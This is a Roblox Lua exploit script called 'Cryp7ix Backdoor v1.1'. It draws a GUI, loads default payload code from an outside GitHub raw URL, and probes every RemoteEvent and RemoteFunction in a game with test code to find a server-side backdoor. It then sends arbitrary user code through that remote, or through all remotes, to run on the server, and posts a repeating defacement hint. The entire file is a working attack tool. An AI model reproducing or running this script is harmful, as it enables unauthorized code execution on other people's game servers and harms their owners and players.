-- Cryp7ix Backdoor v1.1
local HttpService = game:GetService("HttpService")

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Cryp7ixBackdoor"
screenGui.Parent = game:GetService("CoreGui")
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Parent = screenGui
mainFrame.Position = UDim2.new(0.5, -180, 0.5, -120)
mainFrame.Size = UDim2.new(0, 360, 0, 240)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
mainFrame.BorderColor3 = Color3.new(0,0,0)
mainFrame.Active = true
mainFrame.Draggable = true

local innerFrame = Instance.new("Frame")
innerFrame.Parent = mainFrame
innerFrame.Position = UDim2.new(0, 0, 0, 50)
innerFrame.Size = UDim2.new(0, 360, 0, 190)
innerFrame.BackgroundColor3 = Color3.fromRGB(255, 182, 193)
innerFrame.BorderColor3 = Color3.new(0,0,0)
innerFrame.Active = true

local codeBox = Instance.new("TextBox")
codeBox.Parent = innerFrame
codeBox.Position = UDim2.new(0, 5, 0, 5)
codeBox.Size = UDim2.new(0, 350, 0, 140)
codeBox.BackgroundColor3 = Color3.fromRGB(255, 240, 245)
codeBox.BorderColor3 = Color3.new(0,0,0)
codeBox.TextColor3 = Color3.new(1,1,1)
codeBox.MultiLine = true
codeBox.TextXAlignment = Enum.TextXAlignment.Left
codeBox.TextYAlignment = Enum.TextYAlignment.Top
codeBox.Text = game:HttpGet("https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/checkerCode/main.lua")

local deployButton = Instance.new("TextButton")
deployButton.Parent = innerFrame
deployButton.Position = UDim2.new(0, 5, 0, 150)
deployButton.Size = UDim2.new(0, 170, 0, 35)
deployButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
deployButton.BorderColor3 = Color3.new(0,0,0)
deployButton.TextColor3 = Color3.new(1,1,1)
deployButton.Font = Enum.Font.Legacy
deployButton.FontSize = Enum.FontSize.Size14
deployButton.Text = "Deploy"

local captureButton = Instance.new("TextButton")
captureButton.Parent = innerFrame
captureButton.Position = UDim2.new(0, 185, 0, 150)
captureButton.Size = UDim2.new(0, 170, 0, 35)
captureButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
captureButton.BorderColor3 = Color3.new(0,0,0)
captureButton.TextColor3 = Color3.new(1,1,1)
captureButton.Font = Enum.Font.Legacy
captureButton.FontSize = Enum.FontSize.Size14
captureButton.Text = "Capture"

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = mainFrame
titleLabel.Position = UDim2.new(0, 180, 0, 25)
titleLabel.Size = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(255,192,203)
titleLabel.BorderColor3 = Color3.new(0,0,0)
titleLabel.Font = Enum.Font.Legacy
titleLabel.FontSize = Enum.FontSize.Size14
titleLabel.TextColor3 = Color3.new(1,1,1)
titleLabel.Text = "Cryp7ix Backdoor v1.1"

-- Remote handling
local acquiredRemote = nil
local isScanning = false

-- Deploy code function
deployButton.MouseButton1Click:Connect(function()
	local codeStr = codeBox.Text
	local invokeEvent = Instance.new("BindableEvent")
	invokeEvent.Event:Connect(function(remote, str)
		remote:InvokeServer(str)
	end)

	local function deepFire(instance)
		if not isScanning then
			if acquiredRemote == nil then
				for _, child in pairs(instance:GetChildren()) do
					if child.Parent ~= game:GetService("RobloxReplicatedStorage") then
						if child:IsA("RemoteEvent") then
							child:FireServer(codeStr)
						elseif child:IsA("RemoteFunction") then
							invokeEvent:Fire(child, codeStr)
						end
					end
					deepFire(child)
				end
			else
				if acquiredRemote:IsA("RemoteEvent") then
					acquiredRemote:FireServer(codeStr)
				elseif acquiredRemote:IsA("RemoteFunction") then
					task.spawn(function() acquiredRemote:InvokeServer(codeStr) end)
				end
			end
		end
	end

	deepFire(game)
end)

-- Capture backdoor function
captureButton.MouseButton1Click:Connect(function()
	if isScanning then return end
	isScanning = true
	codeBox.Text = "-- Scanning for backdoors..."
	local remoteList = {}

	for _, obj in pairs(game:GetDescendants()) do
		if obj.Parent ~= game:GetService("RobloxReplicatedStorage") then
			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
				table.insert(remoteList, obj)
			end
		end
	end

	for _, remote in pairs(remoteList) do
		if acquiredRemote == nil then
			local randomName = string.char(math.random(0x41,0x5A), math.random(0x41,0x5A), math.random(0x41,0x5A), math.random(0x41,0x5A))
			local testCode = 'Instance.new("Model",workspace).Name="'..randomName..'"'
			if remote.Parent ~= game:GetService("RobloxReplicatedStorage") then
				if remote:IsA("RemoteEvent") then
					remote:FireServer(testCode)
				elseif remote:IsA("RemoteFunction") then
					task.spawn(function() remote:InvokeServer(testCode) end)
				end
			end
			wait(2.5)
			if workspace:FindFirstChild(randomName) and workspace[randomName]:IsA("Model") then
				acquiredRemote = remote
			end
		end
	end

	if acquiredRemote then
		codeBox.Text = "-- Backdoor Found"

		-- Permanent hint loop
		task.spawn(function()
			while acquiredRemote do
				for _, child in pairs(workspace:GetChildren()) do
					if child:IsA("Hint") then child:Destroy() end
				end
				local hint = Instance.new("Hint")
				hint.Text = "Backdoor By Cryp7ix_0"
				hint.Parent = workspace
				wait(9)
			end
		end)
	else
		codeBox.Text = "-- No Backdoor Detected"
	end

	isScanning = false
end)
